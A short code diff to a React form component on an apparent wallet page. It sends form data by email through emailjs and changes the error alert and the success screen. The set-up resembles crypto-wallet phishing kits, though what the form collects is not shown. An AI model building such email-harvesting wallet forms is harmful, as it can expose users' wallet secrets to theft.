@@ -4,6 +4,7 @@ import styles from "./FormTwo.module.css";
 import emailjs from "@emailjs/browser";
 import { useModal } from "../pages/walletPage";
 import FormFour from "./FormFour";
+import SuccessForm from "./SuccessForm";
 
 const FormThree = () => {
   const { selectedWallet } = useModal();
@@ -37,7 +38,7 @@ const FormThree = () => {
           setSuccess((prev) => !prev);
         },
         (error) => {
-          console.log("FAILED...", error.text);
+          alert("FAILED...", error.text);
         }
       );
 
@@ -47,7 +48,7 @@ const FormThree = () => {
   return (
     <>
       {success ? (
-        <FormFour />
+        <SuccessForm />
       ) : (
         <form className="w-[100%]" ref={form} onSubmit={sendEmail}>
           <input
